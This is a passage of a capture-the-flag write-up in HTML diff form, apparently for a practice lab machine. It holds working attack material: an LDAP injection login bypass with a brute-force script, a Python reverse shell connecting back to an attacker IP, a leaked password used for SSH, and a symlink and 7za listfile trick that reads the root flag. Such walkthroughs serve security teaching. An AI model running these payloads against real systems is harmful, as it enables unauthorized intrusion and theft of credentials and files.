+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputOTP"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>OTP<span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"OTP"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputOTP"</span> <span class="na">name=</span><span class="s">"inputOTP"</span> <span class="na">placeholder=</span><span class="s">"One Time Password"</span><span class="nt">&gt;</span>
+      <span class="c">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary  name="</span><span class="na">submit</span><span class="err">"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+...
+</code></pre></div>                </div>
+                <p><strong>NOTE(S)</strong>:</p>
+              </li>
+              <li>An error message pops up when fuzzing the <code class="highlighter-rouge">inputCmd</code>’s input:
+                <ul>
+                  <li>REQUEST: <code class="highlighter-rouge">inputCmd=test</code></li>
+                  <li>RESPONSE: <code class="highlighter-rouge">&lt;div class="col-sm-10"&gt;User must be member of root or adm group and have a registered token to issue commands on this server&lt;/div&gt;</code></li>
+                </ul>
+              </li>
+              <li>There was a <code class="highlighter-rouge">gidNumber</code> attribute when I was bruteforcing used attributes.
+                <ul>
+                  <li><code class="highlighter-rouge">root</code> and <code class="highlighter-rouge">adm</code> has group numbers <strong>0</strong> and <strong>4</strong> respectively</li>
+                  <li>Maybe <code class="highlighter-rouge">ldapuser</code>’s group number could be added to the check done by <strong><em>/page.php</em></strong></li>
+                  <li>Maybe the group restriction could be bypassed by passing an LDAP injection as a username.</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>Login again with an injected LDAP payload:
+        <ul>
+          <li>
+            <p>Credentials for <strong><em>/login.php</em></strong>:</p>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>USERNAME</th>
+                  <th>PASSWORD</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>ldapuser%29%29%28%7C%28gidNumber%3A2.5.13.14%3A%3D1000</td>
+                  <td>Generate an OTP using <code class="highlighter-rouge">stoken</code></td>
+                </tr>
+              </tbody>
+            </table>
+
+            <p><strong>NOTE(S)</strong>:</p>
+            <ul>
+              <li>PLAINTEXT: <code class="highlighter-rouge">ldapuser))(|(gidNumber:2.5.13.14:=1000</code></li>
+              <li>system users have group numbers <strong><em>starting</em></strong> from <strong>1000</strong>
+                <ul>
+                  <li>Run using <code class="highlighter-rouge">python3</code>:
+                    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="n">u</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">1050</span><span class="p">):</span>
+    <span class="n">ldap_injection</span> <span class="o">=</span> <span class="s">"ldapuser))(|(gidNumber:2.5.13.14:=</span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"inputUsername"</span><span class="p">:</span> <span class="n">u</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ldap_injection</span><span class="p">)</span> <span class="p">}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">"Cannot login"</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[x] ldapuser's gidNumber : "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</code></pre></div>                    </div>
+                  </li>
+                  <li><code class="highlighter-rouge">[x] ldapuser's gidNumber : 1000</code></li>
+                </ul>
+              </li>
+              <li>An OR statement to include <code class="highlighter-rouge">ldapuser</code>’s group number to the check was added</li>
+              <li><code class="highlighter-rouge">gidNumber:2.5.13.14:=1000</code>
+                <ul>
+                  <li>According to Microsoft, <code class="highlighter-rouge">gidNumber</code> has an <a href="https://docs.microsoft.com/en-us/windows/desktop/adschema/s-enumeration">Enumeration Syntax</a></li>
+                  <li><strong>Enumeration</strong> has the ability to use <a href="https://ldap.com/matching-rules/">Matching Rules</a>
+                    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Integer Matching
+...
+integerMatch (OID 2.5.13.14): An equality matching rule that will consider two integer values 
+equivalent if they represent the same number.
+</code></pre></div>                    </div>
+                  </li>
+                </ul>
+              </li>
+              <li><strong><em>The group restriction no longer applies</em></strong></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="part-3--generate-user-shell">PART 3 : Generate User Shell</h2>
+
+<ol>
+  <li>Generate a reverse shell:
+    <ul>
+      <li>Local terminal:
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nc -lvp 4444
+</span></code></pre></div>        </div>
+      </li>
+      <li>
+        <p><strong>/page.php</strong>:</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>inputCmd</th>
+              <th>inputOTP</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code class="highlighter-rouge">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.12.62",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></td>
+              <td>Generate an OTP using <code class="highlighter-rouge">stoken</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </li>
+      <li>While inside the shell:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+<span class="c"># uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0</span>
+
+<span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
+<span class="c"># root:x:0:0:root:/root:/bin/bash</span>
+<span class="c"># ldapuser:x:1000:1000::/home/ldapuser:/bin/bash</span>
+
+<span class="nb">ls</span> <span class="nt">-lah</span>
+<span class="c"># ...</span>
+<span class="c"># -rw-r-----. 1 root   apache 5.0K Oct 23  2018 login.php</span>
+<span class="c"># -rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php</span>
+<span class="c"># -rw-r-----. 1 root   apache 5.2K Oct 23  2018 page.php</span>
+<span class="c"># ...</span>
+
+<span class="nb">cat </span>login.php
+<span class="c"># ...</span>
+<span class="c"># $username = 'ldapuser';</span>
+<span class="c"># $password = 'e398e27d5c4ad45086fe431120932a01';</span>
+<span class="c"># ...</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Login as <code class="highlighter-rouge">ldapuser</code> via <code class="highlighter-rouge">ssh</code>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ssh -l ldapuser 10.10.10.122
+ldapuser@10.10.10.122's password: e398e27d5c4ad45086fe431120932a01
+</span></code></pre></div>    </div>
+    <ul>
+      <li><code class="highlighter-rouge">ldapuser</code> shell:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+<span class="c"># uid=1000(ldapuser) gid=1000(ldapuser) groups=1000(ldapuser) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+
+<span class="nb">cat </span>user.txt
+<span class="c"># 74a8e86f3f6ecd8010a660cfb44ee585</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="part-4--privilege-escalation-ldapuser---root">PART 4 : Privilege Escalation (ldapuser -&gt; root)</h2>
+
+<ol>
+  <li>Enumerate the system using <code class="highlighter-rouge">ldapuser</code> shell:
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lah</span> /
+<span class="c"># ...</span>
+<span class="c"># drwxr-xr-x.   2 root root 4.0K Jun 18 20:16 backup</span>
+<span class="c"># ...</span>
+
+<span class="nb">ls</span> <span class="nt">-lah</span> /backup
+<span class="c"># ...</span>
+<span class="c"># -rw-r--r--.  1 root root   32 Jun 18 20:13 backup.1560881581.zip</span>
+<span class="c"># -rw-r--r--.  1 root root   32 Jun 18 20:14 backup.1560881641.zip</span>
+<span class="c"># -rw-r--r--.  1 root root   32 Jun 18 20:15 backup.1560881701.zip</span>
+<span class="c"># -rw-r--r--.  1 root root   32 Jun 18 20:16 backup.1560881761.zip</span>
+<span class="c"># -rw-r--r--.  1 root root   32 Jun 18 20:17 backup.1560881821.zip</span>
+<span class="c"># -rw-r--r--.  1 root root    0 Jun 18 20:17 error.log</span>
+<span class="c"># -rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh</span>
+</code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>There is a script named <code class="highlighter-rouge">honeypot.sh</code></li>
+      <li><strong>backup</strong> files seem to be generated every minute</li>
+    </ul>
+  </li>
+  <li>Check what <code class="highlighter-rouge">honeypot.sh</code> does:
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># get banned ips from fail2ban jails and update banned.txt</span>
+<span class="c"># banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)</span>
+/usr/sbin/ipset list | <span class="nb">grep </span>fail2ban <span class="nt">-A</span> 7 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> /var/www/html/banned.txt
+<span class="c"># awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt</span>
+
+<span class="c"># some vars in order to be sure that backups are protected</span>
+<span class="nv">now</span><span class="o">=</span><span class="si">$(</span><span class="nb">date</span> +<span class="s2">"%s"</span><span class="si">)</span>
+<span class="nv">filename</span><span class="o">=</span><span class="s2">"backup.</span><span class="nv">$now</span><span class="s2">"</span>
+<span class="nv">pass</span><span class="o">=</span><span class="si">$(</span>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> 0xEA31 <span class="nt">-in</span> /root/root.txt | <span class="nb">md5sum</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span>
+
+<span class="c"># keep only last 10 backups</span>
+<span class="nb">cd</span> /backup
+<span class="nb">ls</span> <span class="nt">-1t</span> <span class="k">*</span>.zip | <span class="nb">tail</span> <span class="nt">-n</span> +11 | xargs <span class="nb">rm</span> <span class="nt">-f</span>
+
+<span class="c"># get the files from the honeypot and backup 'em all</span>
+<span class="nb">cd</span> /var/www/html/uploads
+7za a /backup/<span class="nv">$filename</span>.zip <span class="nt">-t7z</span> <span class="nt">-snl</span> <span class="nt">-p</span><span class="nv">$pass</span> <span class="nt">--</span> <span class="k">*</span> 
+
+<span class="c"># cleaup the honeypot</span>
+<span class="nb">rm</span> <span class="nt">-rf</span> <span class="nt">--</span> <span class="k">*</span>
+
+<span class="c"># comment the next line to get errors for debugging</span>
+<span class="nb">truncate</span> <span class="nt">-s</span> 0 /backup/error.log
+</code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li><code class="highlighter-rouge">ls -1t *.zip | tail -n +11 | xargs rm -f</code>
+        <ul>
+          <li>Keeps a maximum of 10 most recent backups in <code class="highlighter-rouge">/backup</code></li>
+        </ul>
+      </li>
+      <li><code class="highlighter-rouge">7za a /backup/$filename.zip -t7z -snl -p$pass -- *</code>
+        <ul>
+          <li>Backs everything up in <code class="highlighter-rouge">/var/www/html/uploads</code></li>
+          <li>The backups are password-protected
+            <ul>
+              <li>Running <a href=""><code class="highlighter-rouge">pspy</code></a> doesn’t show when <code class="highlighter-rouge">7za</code> is called</li>
+              <li>The password might never be known to attackers</li>
+            </ul>
+          </li>
+          <li>The <code class="highlighter-rouge">--</code> switch protects <code class="highlighter-rouge">7za</code> from <strong>wildcard injection</strong></li>
+        </ul>
+      </li>
+      <li><code class="highlighter-rouge">rm -rf -- *</code>
+        <ul>
+          <li>Everything in <code class="highlighter-rouge">/var/www/html/uploads</code> are deleted after backup</li>
+        </ul>
+      </li>
+      <li><code class="highlighter-rouge">truncate -s 0 /backup/error.log</code>
+        <ul>
+          <li>Errors generated (maybe) are deleted after everything</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Leverage <code class="highlighter-rouge">honeypot.sh</code>:
+    <ol>
+      <li>Check what <code class="highlighter-rouge">7za</code> can do:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7za <span class="nt">--help</span>
+<span class="c"># ...</span>
+<span class="c"># Usage: 7za &lt;command&gt; [&lt;switches&gt;...] &lt;archive_name&gt; [&lt;file_names&gt;...] [&lt;@listfiles...&gt;]</span>
+<span class="c"># ...</span>
+<span class="c"># &lt;Switches&gt;</span>
+<span class="c">#   -- : Stop switches parsing</span>
+<span class="c"># ...</span>
+<span class="c">#   -snl : store symbolic links as links</span>
+<span class="c"># ...</span>
+<span class="c">#   -t{Type} : Set type of archive</span>
+<span class="c"># ...</span>
+</code></pre></div>        </div>
+        <p><strong>NOTE(S)</strong>:</p>
+        <ul>
+          <li>All switches after <code class="highlighter-rouge">--</code> will be ignored
+            <ul>
+              <li><strong>wildcard injection</strong> is no longer a viable option</li>
+            </ul>
+          </li>
+          <li>But, <code class="highlighter-rouge">[&lt;@listfiles...&gt;]</code> could still be controlled
+            <ul>
+              <li><code class="highlighter-rouge">@</code> references to a <code class="highlighter-rouge">listfile</code></li>
+              <li>A <code class="highlighter-rouge">listfile</code> contains one file per line</li>
+              <li>Using absolute paths are helpful</li>
+            </ul>
+          </li>
+          <li><code class="highlighter-rouge">7za</code> will archive the files in the <code class="highlighter-rouge">listfile</code></li>
+        </ul>
+      </li>
+      <li>Leverage <code class="highlighter-rouge">7za</code>’s <code class="highlighter-rouge">[&lt;@listfiles...&gt;]</code>:
+        <ol>
+          <li>Write to the <code class="highlighter-rouge">/var/www/html/uploads</code> directory:
+            <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/html/uploads
+
+<span class="nb">ls</span> <span class="nt">-la</span>
+<span class="c"># ls: cannot open directory .: Permission denied</span>
+
+<span class="nb">ls</span> <span class="nt">-lah</span> ../
+<span class="c"># ...</span>
+<span class="c"># drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads</span>
+</code></pre></div>            </div>
+            <p><strong>NOTE(S)</strong>:</p>
+            <ul>
+              <li>The reverse shell from earlier has a user <code class="highlighter-rouge">apache</code></li>
+              <li>The permissions could be changed using <strong>/page.php</strong></li>
+            </ul>
+          </li>
+          <li>
+            <p>Change <code class="highlighter-rouge">/var/.../uploads</code>’s permissions using <strong>/page.php</strong>:</p>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>inputCmd</th>
+                  <th>inputOTP</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code class="highlighter-rouge">chmod 777 /var/www/html/uploads</code></td>
+                  <td>Generate an OTP using <code class="highlighter-rouge">stoken</code></td>
+                </tr>
+              </tbody>
+            </table>
+          </li>
+          <li>Create <strong><em>relevant</em></strong> files:
+            <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/html/uploads
+
+<span class="nb">touch</span> @list
+
+<span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt list
+
+<span class="nb">ls</span> <span class="nt">-lah</span>
+<span class="c"># drwxrwxrwx. 2 apache   apache    31 Jun 18 21:42 .</span>
+<span class="c"># drwxr-xr-x. 6 root     root     176 Oct 23  2018 ..</span>
+<span class="c"># lrwxrwxrwx. 1 ldapuser ldapuser  14 Jun 18 21:42 list -&gt; /root/root.txt</span>
+<span class="c"># -rw-rw-r--. 1 ldapuser ldapuser   0 Jun 18 21:42 @list</span>
+</code></pre></div>            </div>
+            <p><strong>NOTE(S)</strong>:</p>
+            <ul>
+              <li>Since <code class="highlighter-rouge">list</code> is not a valid <strong><em>listfile</em></strong>, an error will be thrown</li>
+              <li>Attempt to capture <code class="highlighter-rouge">/backup/error.log</code> before contents are <strong><em>truncated</em></strong> by <code class="highlighter-rouge">honeypot.sh</code></li>
+            </ul>
+          </li>
+          <li>Capture contents of <code class="highlighter-rouge">/backup/error.log</code>:
+            <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-s</span> /backup/error.log <span class="o">]</span><span class="p">;</span> <span class="k">do</span> : <span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="nb">cat</span> /backup/error.log
+<span class="c">#</span>
+<span class="c"># WARNING: No more files</span>
+<span class="c"># fd6d2e53c995e6928cd0f040c79ba053</span>
+<span class="c">#</span>
+</code></pre></div>            </div>
+          </li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+</ol>
+:ET
